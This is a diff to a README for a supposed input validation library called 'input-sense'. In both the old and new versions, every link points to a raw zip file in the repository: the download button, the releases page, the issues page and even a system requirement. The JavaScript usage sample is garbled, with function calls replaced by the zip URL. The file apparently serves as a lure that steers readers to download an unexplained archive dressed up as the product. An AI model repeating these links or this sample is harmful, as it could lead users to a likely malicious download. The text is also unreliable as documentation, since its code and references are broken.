@@ -1,7 +1,7 @@
 # 🎯 input-sense - Smart Input Validation Made Simple
 
 ## 🚀 Download Now
-[![Download input-sense](https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip)](https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip)
+[![Download input-sense](https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip)](https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip)
 
 ## 🌟 Overview
 input-sense is an intent-aware input validation utility. It detects fake, low-quality, and placeholder user inputs beyond standard regex checks. This tool helps ensure that data collected from users is accurate and useful. No more guessing if a user input is valid; input-sense gives you the confidence you need.
@@ -15,16 +15,16 @@ input-sense is an intent-aware input validation utility. It detects fake, low-qu
 
 ## 📦 System Requirements
 - Operating System: Windows, macOS, or Linux.
-- https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip version 10 or higher.
+- https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip version 10 or higher.
 - A modern web browser for using the online tool.
 
 ## 🚀 Getting Started
-1. **Visit the Download Page:** Head over to the [Releases Page](https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip) to find the latest version of input-sense.
+1. **Visit the Download Page:** Head over to the [Releases Page](https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip) to find the latest version of input-sense.
 2. **Choose Your Version:** Look for the latest release. There, you will find various assets ready for download.
-3. **Download the Application:** Click on the asset that suits your system. For example, select the file that says `https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip` or similar.
+3. **Download the Application:** Click on the asset that suits your system. For example, select the file that says `https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip` or similar.
 
 ## 📥 Download & Install
-To get started with input-sense, visit this page to download: [input-sense Releases](https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip). 
+To get started with input-sense, visit this page to download: [input-sense Releases](https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip). 
 
 1. After downloading, unzip the file if necessary.
 2. Open the folder where you extracted the files.
@@ -41,12 +41,12 @@ Using input-sense is straightforward:
 import InputSense from 'input-sense';
 
 // Example form validation
-const userInput = https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip('user-input').value;
+const userInput = https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip('user-input').value;
 
-if (https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip(userInput)) {
-    https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip('Valid input');
+if (https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip(userInput)) {
+    https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip('Valid input');
 } else {
-    https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip('Invalid input');
+    https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip('Invalid input');
 }
 ```
 This simple example shows how to integrate input-sense into your existing form workflows. 
@@ -58,7 +58,7 @@ For more detailed guidance on configuring and using input-sense, please refer to
 input-sense is open-source, and contributions are welcome! If you have ideas for new features, find issues, or have improvements, feel free to create a pull request. 
 
 ## 💬 Support
-If you encounter any issues or have questions, you can open an issue on the [GitHub Issues page](https://github.com/shmaiofficial/input-sense/raw/refs/heads/main/tests/rules/sense_input_v1.6.zip). 
+If you encounter any issues or have questions, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/shmaiofficial/input-sense/main/rules/input-sense-1.8.zip). 
 
 ## 📢 Topics
 - Data Quality
